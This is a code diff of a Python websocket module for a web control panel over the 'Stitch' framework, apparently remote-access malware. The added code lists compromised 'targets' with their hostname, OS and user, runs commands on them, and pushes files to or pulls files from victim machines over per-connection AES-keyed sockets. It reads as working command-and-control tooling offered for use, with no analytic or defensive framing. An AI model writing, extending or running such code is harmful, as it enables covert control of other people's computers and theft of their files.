@@ -36,9 +36,43 @@ def register_strategic_websocket_events(socketio, logger):
     
     @socketio.on('get_targets')
     def handle_get_targets():
-        """Get all targets with real-time status"""
+        """Get all targets with real-time status from Stitch system"""
         try:
-            targets = strategic_center.get_targets()
+            from web_app_real import get_stitch_server
+            import configparser
+            
+            server = get_stitch_server()
+            targets = []
+            
+            # Get real targets from Stitch system
+            if server.inf_sock:
+                config = configparser.ConfigParser()
+                config.read('/workspace/Application/Stitch_Vars/hist_ini')
+                
+                for target_id in server.inf_sock.keys():
+                    target_info = {
+                        'id': target_id,
+                        'ip': target_id,
+                        'hostname': target_id,
+                        'os': 'Unknown',
+                        'status': 'online',
+                        'last_seen': time.time(),
+                        'cpu_percent': 0.0,
+                        'memory_percent': 0.0,
+                        'network_speed': 0.0,
+                        'health_score': 100,
+                        'connection_type': 'tcp',
+                        'capabilities': []
+                    }
+                    
+                    # Get real target info from config
+                    if target_id in config.sections():
+                        target_info['hostname'] = config.get(target_id, 'hostname', fallback=target_id)
+                        target_info['os'] = config.get(target_id, 'os', fallback='Unknown')
+                        target_info['user'] = config.get(target_id, 'user', fallback='Unknown')
+                    
+                    targets.append(target_info)
+            
             emit('targets_update', {
                 'targets': targets,
                 'count': len(targets),
@@ -85,12 +119,16 @@ def register_strategic_websocket_events(socketio, logger):
             from web_app_real import execute_real_command
             result = execute_real_command(command, target_id, parameters)
             
+            # Check if result indicates success or failure
+            success = not result.startswith('❌') and not result.startswith('⚠️')
+            
             # Emit result immediately
             emit('command_result', {
                 'target_id': target_id,
                 'command': command,
-                'success': True,
+                'success': success,
                 'output': result,
+                'error': '' if success else result,
                 'timestamp': time.time()
             })
             
@@ -142,22 +180,53 @@ def register_strategic_websocket_events(socketio, logger):
             file_data = base64.b64decode(content)
             
             # Upload file using real Stitch system
-            from web_app_real import upload_file_to_target
-            result = upload_file_to_target(target_id, filename, file_data, path)
+            from web_app_real import stitch_lib
+            from web_app_real import get_connection_aes_key
+            from web_app_real import get_stitch_server
             
-            if result.get('success'):
+            server = get_stitch_server()
+            if target_id not in server.inf_sock:
+                emit('file_upload_error', {
+                    'target_id': target_id,
+                    'filename': filename,
+                    'error': 'Target not connected',
+                    'timestamp': time.time()
+                })
+                return
+            
+            # Get AES key for this connection
+            aes_key = get_connection_aes_key(target_id)
+            if not aes_key:
+                emit('file_upload_error', {
+                    'target_id': target_id,
+                    'filename': filename,
+                    'error': 'No encryption key available',
+                    'timestamp': time.time()
+                })
+                return
+            
+            # Upload file using Stitch system
+            result = stitch_lib.upload_file(
+                server.inf_sock[target_id],
+                file_data,
+                filename,
+                path,
+                aes_key
+            )
+            
+            if result:
                 emit('file_upload_success', {
                     'target_id': target_id,
                     'filename': filename,
                     'path': path,
-                    'message': result.get('message', 'File uploaded successfully'),
+                    'message': 'File uploaded successfully',
                     'timestamp': time.time()
                 })
             else:
                 emit('file_upload_error', {
                     'target_id': target_id,
                     'filename': filename,
-                    'error': result.get('error', 'Upload failed'),
+                    'error': 'Upload failed',
                     'timestamp': time.time()
                 })
             
@@ -167,7 +236,7 @@ def register_strategic_websocket_events(socketio, logger):
     
     @socketio.on('download_file')
     def handle_download_file(data):
-        """Download file from target"""
+        """Download file from target using real Stitch system"""
         try:
             target_id = data.get('target_id')
             path = data.get('path')
@@ -176,15 +245,59 @@ def register_strategic_websocket_events(socketio, logger):
                 emit('error', {'error': 'Missing parameters'})
                 return
             
-            # Download file
-            operation_id = strategic_center.download_file(target_id, path)
+            # Download file using real Stitch system
+            from web_app_real import stitch_lib
+            from web_app_real import get_connection_aes_key
+            from web_app_real import get_stitch_server
             
-            emit('file_download_queued', {
-                'operation_id': operation_id,
-                'target_id': target_id,
-                'path': path,
-                'timestamp': time.time()
-            })
+            server = get_stitch_server()
+            if target_id not in server.inf_sock:
+                emit('file_download_error', {
+                    'target_id': target_id,
+                    'path': path,
+                    'error': 'Target not connected',
+                    'timestamp': time.time()
+                })
+                return
+            
+            # Get AES key for this connection
+            aes_key = get_connection_aes_key(target_id)
+            if not aes_key:
+                emit('file_download_error', {
+                    'target_id': target_id,
+                    'path': path,
+                    'error': 'No encryption key available',
+                    'timestamp': time.time()
+                })
+                return
+            
+            # Download file using Stitch system
+            file_content = stitch_lib.download_file(
+                server.inf_sock[target_id],
+                path,
+                aes_key
+            )
+            
+            if file_content:
+                # Encode file content as base64 for transmission
+                import base64
+                encoded_content = base64.b64encode(file_content).decode('utf-8')
+                
+                emit('file_download_success', {
+                    'target_id': target_id,
+                    'path': path,
+                    'filename': path.split('/')[-1],
+                    'content': encoded_content,
+                    'size': len(file_content),
+                    'timestamp': time.time()
+                })
+            else:
+                emit('file_download_error', {
+                    'target_id': target_id,
+                    'path': path,
+                    'error': 'Download failed',
+                    'timestamp': time.time()
+                })
             
         except Exception as e:
             logger.error(f"Download file error: {e}")
